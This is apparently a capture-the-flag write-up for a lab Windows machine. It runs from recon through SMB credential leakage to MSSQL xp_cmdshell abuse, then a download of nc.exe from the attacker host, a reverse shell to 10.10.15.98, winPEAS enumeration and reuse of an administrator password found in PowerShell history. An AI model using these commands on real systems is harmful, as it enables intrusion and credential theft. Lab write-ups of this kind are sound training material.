## Machine Info

**Tags**

Network, Protocols, MSSQL, SMB, Impacket, Powershell, Reconnaissance, Remote Code Execution, Clear Text Credentials, Information Disclosure, Anonymous/Guest Access

## Recon

- `$ cat nmap/detail.nmap`
```bash
# Nmap 7.94 scan initiated Tue Nov 21 06:53:44 2023 as: nmap -sT -sV -sC -O -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -oA nmap/detail 10.129.219.154
Nmap scan report for 10.129.219.154
Host is up (0.26s latency).

PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  0пU      Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s    Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info:
|   10.129.219.154:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-11-20T22:51:49
|_Not valid after:  2053-11-20T22:51:49
|_ssl-date: 2023-11-20T22:58:22+00:00; +3m17s from scanner time.
| ms-sql-ntlm-info:
|   10.129.219.154:1433:
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
5985/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc       Microsoft Windows RPC
49665/tcp open  msrpc       Microsoft Windows RPC
49666/tcp open  msrpc       Microsoft Windows RPC
49667/tcp open  msrpc       Microsoft Windows RPC
49668/tcp open  msrpc       Microsoft Windows RPC
49669/tcp open  msrpc       Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

find two main services:
- 445 smb
- 1433 mssql

## Foothold

### smb backup leakage

```bash
$ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

SQLNCLI10 cred:

- ARCHETYPE(domain)\sql_svc(user):M3g4c0rp123(password)

### mssql

- `impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@$IP -windows-auth`, windows-auth option cannot be missing

```bash
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\';
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

- enbale xp_cmdshell in mssql

```powershell
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\';
output
----------------------------------------------------------
 Volume in drive C has no label.

 Volume Serial Number is 9565-0B4F

NULL

 Directory of C:\

NULL

01/20/2020  04:20 AM    <DIR>          backups

07/27/2021  01:28 AM    <DIR>          PerfLogs

07/27/2021  02:20 AM    <DIR>          Program Files

07/27/2021  02:20 AM    <DIR>          Program Files (x86)

01/19/2020  10:39 PM    <DIR>          Users

07/27/2021  02:22 AM    <DIR>          Windows

               0 File(s)              0 bytes

               6 Dir(s)  10,723,508,224 bytes free

NULL
```

### get a shell from mssql

- download nc.exe from local machine

```powershell
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -c cd; curl http://10.10.15.98/nc64.exe -O c:\Users\sql_svc\Downloads\nc.exe'
output
------
NULL

SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir c:\Users\sql_svc\Downloads\'
output
--------------------------------------------------
 Volume in drive C has no label.

 Volume Serial Number is 9565-0B4F

NULL

 Directory of c:\Users\sql_svc\Downloads

NULL

11/20/2023  04:52 PM    <DIR>          .

11/20/2023  04:52 PM    <DIR>          ..

11/20/2023  04:52 PM            45,272 nc.exe

               1 File(s)         45,272 bytes

               2 Dir(s)  10,721,443,840 bytes free

NULL
```

- use nc to start a rshell

```powershell
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell ‘c:\Users\sql_svc\Downloads\nc.exe 10.10.15.98 1234 -e cmd.exe’
```

## Privilege Escalation

### enumeration

- curl winPEAS from local machine

```powershell
C:\Users\sql_svc\Downloads>curl -O http://10.10.15.98/winPEAS.bat
curl -O http://10.10.15.98/winPEAS.bat
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 36177  100 36177    0     0  36177      0  0:00:01 --:--:--  0:00:01 42863

C:\Users\sql_svc\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\sql_svc\Downloads

11/20/2023  04:56 PM    <DIR>          .
11/20/2023  04:56 PM    <DIR>          ..
11/20/2023  04:52 PM            45,272 nc.exe
11/20/2023  04:56 PM            36,177 winPEAS.bat
               2 File(s)         81,449 bytes
               2 Dir(s)  10,721,406,976 bytes free
```

- execute winPEAS and check output, finding potential creds from possible files

```
 [+] Files in registry that may contain credentials
   [i] Searching specific files that may contains credentials.
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
Looking inside HKCU\Software\ORL\WinVNC3\Password
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
    DefaultDomainName    REG_SZ
    DefaultUserName    REG_SZ
Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
Looking inside HKCU\Software\TightVNC\Server
Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
Looking inside HKCU\Software\OpenSSH\Agent\Keys
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Windows\Panther\setupinfo
C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.2061.1.7\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_f6f6520641f6caff\f\appcmd.exe
C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.2061.1.7\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_f6f6520641f6caff\r\appcmd.exe
C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.2061.1.7\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_014afc5876578cfa\f\appcmd.exe
C:\Windows\servicing\LCU\Package_for_RollupFix~31bf3856ad364e35~amd64~~17763.2061.1.7\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_014afc5876578cfa\r\appcmd.exe
C:\Windows\WinSxS\amd64_ipamprov-dcnps_31bf3856ad364e35_10.0.17763.1_none_90fd9849ea1e4266\ScheduledTasks.xml
C:\Windows\WinSxS\amd64_ipamprov-dhcp_31bf3856ad364e35_10.0.17763.1_none_64f02b544b2506ef\ScheduledTasks.xml
C:\Windows\WinSxS\amd64_ipamprov-dns_31bf3856ad364e35_10.0.17763.1_none_825235baef207c8d\ScheduledTasks.xml
C:\Windows\WinSxS\amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_10.0.17763.1_none_8bd0f81f9b897a08\ntds.dit
C:\Windows\WinSxS\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_f6f6520641f6caff\appcmd.exe
C:\Windows\WinSxS\amd64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1_none_9a517574c8380381\appcmd.exe
C:\Windows\WinSxS\amd64_microsoft-windows-webenroll.resources_31bf3856ad364e35_10.0.17763.1_en-us_742f5bf0baaff2c7\certnew.cer
C:\Windows\WinSxS\wow64_ipamprov-dcnps_31bf3856ad364e35_10.0.17763.1_none_9b52429c1e7f0461\ScheduledTasks.xml
C:\Windows\WinSxS\wow64_ipamprov-dhcp_31bf3856ad364e35_10.0.17763.1_none_6f44d5a67f85c8ea\ScheduledTasks.xml
C:\Windows\WinSxS\wow64_ipamprov-dns_31bf3856ad364e35_10.0.17763.1_none_8ca6e00d23813e88\ScheduledTasks.xml
C:\Windows\WinSxS\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1790_none_014afc5876578cfa\appcmd.exe
C:\Windows\WinSxS\wow64_microsoft-windows-i..raries-servercommon_31bf3856ad364e35_10.0.17763.1_none_a4a61fc6fc98c57c\appcmd.exe
```

### high-priv creds

- `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

```powershell
C:\Windows\system32>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

- `administrator:MEGACORP_4dm1n!!`
- connect as admin using evil-winrm or psexec

```bash
$ impacket-psexec administrator@$IP
$ evil-winrm -i $IP -u Administrator
```
